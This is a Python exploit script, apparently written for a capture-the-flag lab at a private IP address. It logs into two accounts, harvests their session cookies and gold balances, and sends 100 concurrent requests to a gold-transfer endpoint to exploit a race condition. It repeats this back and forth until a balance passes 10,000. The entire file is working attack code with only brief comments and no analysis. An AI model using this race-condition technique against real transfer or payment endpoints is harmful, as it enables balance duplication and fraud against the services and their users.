#!/usr/bin/env python
import grequests
import requests
from bs4 import BeautifulSoup

ip_address = "10.10.160.62"
user_1 = "2"
pass_1 = "2"
user_2 = "1"
pass_2 = "1"

# Retrieve users cookie and current amount of gold.
def userGoldAndCookie(username, password):
 payload = {
 'username': username,
 'password': password
 }
 # Retrieve Gold Amount and Cookie for the specified user.
 with requests.Session() as s:
  # Login as the specified user.
  p = s.post('http://{}/api/login'.format(ip_address), data=payload)
  # Get the amount of gold for the specified user.
  gold_amount = 0
  soup = BeautifulSoup(p.text, "html.parser")
  for tag in soup.find_all('a'):
   if "Gold:" in tag.text:
    gold_amount = int(str(tag.text).split(":", 1)[1].strip())
    print("Current Gold Amount for User {}: {}".format(username, gold_amount))
  # Get the new cookie generated for the user.
  cookie_dict = s.cookies.get_dict()
  return cookie_dict['connect.sid'], gold_amount
  
  
# Function is used to send gold to a user.
def sendGold(user, cookie, amount):
 print("Sending {} gold to user {}".format(amount, user))
 # Websites URL used to give gold to another user.
 url = 'http://{}/api/givegold'.format(ip_address)# Network POST Request Headers
 headers = {
 "Host" : "{}".format(ip_address),
 "Referer" : "http://{}/giving.html".format(ip_address),
 "Content-Type" : "application/x-www-form-urlencoded",
 "Connection" : "close",
 "Cookie" : "connect.sid={}".format(cookie),
 "Upgrade-Insecure-Requests" : "1"
 }
    
 # The cookie of the user sending the gold
 cookies = {
 "connect.sid" : cookie
 }
 # N.B. Need to use data instead of params for a POST Request
 # This will send multiple POST requests, giving at user 1000 gold in each POST request.
 data = "user={}&amount={}".format(user,amount)
 # Send asynchronous post requests
 rs = (grequests.post(url, data=data, cookies=cookies, headers=headers) for i in range(0,100))
 requests = grequests.map(rs)
 print("{} gold has been sent to user {}!".format(amount, user))
 
 

gold_needed = 0
counter = 1

while gold_needed < 10000:
 if counter % 2 == 0:
  print("{} turn to send gold...".format(user_1))
  values = userGoldAndCookie(user_1, pass_1)
  gold_needed = values[1]
  sendGold(user_2, values[0], values[1])
  counter += 1
 else:
  print("{} turn to send gold...".format(user_2))
  values = userGoldAndCookie(user_2, pass_2)
  gold_needed = values[1]
  sendGold(user_1, values[0], values[1])
  counter += 1